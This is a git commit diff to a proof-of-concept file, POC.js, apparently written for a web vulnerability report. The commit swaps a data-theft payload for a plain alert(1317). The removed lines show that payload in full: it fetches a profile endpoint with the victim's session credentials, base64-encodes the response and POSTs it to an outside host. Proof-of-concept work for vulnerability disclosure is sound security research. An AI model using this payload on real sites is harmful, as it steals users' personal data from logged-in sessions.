48b0a94da4546ad38c34339b2054b5aa12f1de33
hamza lachgar <121760220+am7maaz@users.noreply.github.com>
2026-04-26 17:22:56 +0100

    Remove fetch logic and add alert
    Removed fetch calls and added an alert.

--- POC.js
+++ POC.js
@@ -1,15 +1,1 @@
-const response = await fetch(`/membersinfo/profile/?data=testhmza`, {
-  method: 'GET',
-  credentials: 'include'
-});
-
-const data = await response.json();
-const base64Data = btoa(JSON.stringify(data));
-
-fetch(`https://ddddtrip.com/testhmzaa/`, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({ data: base64Data })
-});
+alert(1317)
